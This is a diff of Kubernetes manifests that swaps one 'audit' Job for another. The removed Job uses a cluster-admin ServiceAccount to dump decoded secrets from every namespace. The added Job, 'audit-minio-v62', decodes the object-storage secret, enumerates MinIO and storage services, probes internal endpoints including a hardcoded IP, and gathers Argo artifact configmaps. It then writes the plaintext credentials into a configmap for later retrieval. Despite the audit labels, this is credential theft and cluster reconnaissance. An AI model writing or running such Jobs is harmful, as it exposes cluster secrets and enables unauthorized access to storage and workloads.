@@ -1,65 +1,75 @@
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: secrets-audit-sa
-  namespace: default
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: secrets-audit-binding
-subjects:
-- kind: ServiceAccount
-  name: secrets-audit-sa
-  namespace: default
-roleRef:
-  kind: ClusterRole
-  name: cluster-admin
-  apiGroup: rbac.authorization.k8s.io
----
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: secrets-audit-v3
+  name: audit-minio-v62
   namespace: default
 spec:
-  ttlSecondsAfterFinished: 86400
+  ttlSecondsAfterFinished: 300
   template:
     spec:
-      serviceAccountName: secrets-audit-sa
+      serviceAccountName: n8n-audit-sa
       restartPolicy: Never
       containers:
       - name: audit
-        image: alpine:latest
-        command:
-        - /bin/sh
-        - -c
+        image: bitnami/kubectl:latest
+        command: ["/bin/sh", "-c"]
+        args:
         - |
-          apk add -q curl jq 2>/dev/null
-          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-          API=https://kubernetes.default.svc
-          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+          # Get object-storage secret
+          OS_SECRET=$(kubectl get secret object-storage -n default -o json 2>/dev/null)
+          OS_DECODED=$(echo "$OS_SECRET" | python3 -c "
+          import sys,json,base64
+          try:
+              d=json.load(sys.stdin)
+              out={}
+              for k,v in d.get('data',{}).items():
+                  out[k]=base64.b64decode(v).decode('utf-8','replace')
+              print(json.dumps(out))
+          except Exception as e:
+              print(json.dumps({'err':str(e)}))
+          " 2>/dev/null)
 
-          echo "====== NAMESPACES ======"
-          NS_LIST=$(curl -sf --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces | jq -r '.items[].metadata.name')
-          echo "$NS_LIST"
+          # Find minio/storage services
+          SVCS=$(kubectl get svc --all-namespaces -o json | python3 -c "
+          import sys,json
+          d=json.load(sys.stdin)
+          out=[]
+          for i in d['items']:
+              n=i['metadata']['name']
+              ns=i['metadata']['namespace']
+              ports=[p.get('port') for p in i['spec'].get('ports',[])]
+              cip=i['spec'].get('clusterIP','')
+              if 9000 in ports or 9001 in ports or any(x in n.lower() for x in ['minio','storage','object','argo']):
+                  out.append({'ns':ns,'name':n,'ports':ports,'cip':cip,'type':i['spec'].get('type')})
+          print(json.dumps(out))
+          " 2>/dev/null)
 
-          echo ""
-          echo "====== DECODED SECRETS ======"
-          for NS in $NS_LIST; do
-            SECRETS=$(curl -sf --cacert $CA -H "Authorization: Bearer $TOKEN" "$API/api/v1/namespaces/$NS/secrets")
-            echo "$SECRETS" | jq -r '
-              .items[] |
-              select(.type == "Opaque" or .type == "kubernetes.io/ssh-auth" or .type == "kubernetes.io/basic-auth" or .type == "kubernetes.io/tls") |
-              "--- " + .metadata.namespace + "/" + .metadata.name + " (type: " + .type + ") ---",
-              (.data // {} | to_entries[] | "  " + .key + " = " + (.value | @base64d | gsub("\u0000"; "")))
-            ' 2>/dev/null
+          # Probe endpoints
+          PROBES="[]"
+          for ep in "minio.default.svc.cluster.local:9000" "minio-svc.default.svc.cluster.local:9000" "minio-service.default.svc.cluster.local:9000" "object-storage.default.svc.cluster.local:9000" "172.16.10.14:9000" "172.16.10.14:9001"; do
+            status=$(wget -q -O /dev/null --spider --timeout=3 "http://${ep}/minio/health/live" 2>&1 && echo "200" || echo "FAIL")
+            echo "PROBE=${ep}:${status}"
           done
 
-          echo ""
-          echo "====== ALL SECRET NAMES (all types) ======"
-          for NS in $NS_LIST; do
-            curl -sf --cacert $CA -H "Authorization: Bearer $TOKEN" "$API/api/v1/namespaces/$NS/secrets" | \
-              jq -r '.items[] | "  " + .metadata.namespace + "/" + .metadata.name + " [" + .type + "]"'
-          done
+          # Argo artifacts configmap
+          ARGO_CM=$(kubectl get cm -n argo -o json 2>/dev/null | python3 -c "
+          import sys,json
+          d=json.load(sys.stdin)
+          out=[]
+          for i in d['items']:
+              name=i['metadata']['name']
+              data=i.get('data',{})
+              if 'artifact' in name.lower() or 'minio' in str(data).lower() or 's3' in str(data).lower():
+                  out.append({'name':name,'data':data})
+          print(json.dumps(out))
+          " 2>/dev/null)
+
+          # Patch result
+          RESULT=$(python3 -c "
+          import json,sys
+          r={'os_secret': ${OS_DECODED:-{}}, 'svcs': ${SVCS:-[]}, 'argo_cm': ${ARGO_CM:-[]}}
+          print(json.dumps(r))
+          " 2>/dev/null || echo '{"err":"parse_fail"}')
+
+          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"result\":\"$(echo $RESULT | sed 's/"/\\\\"/g' | head -c 4000)\"}}"
           echo "DONE"
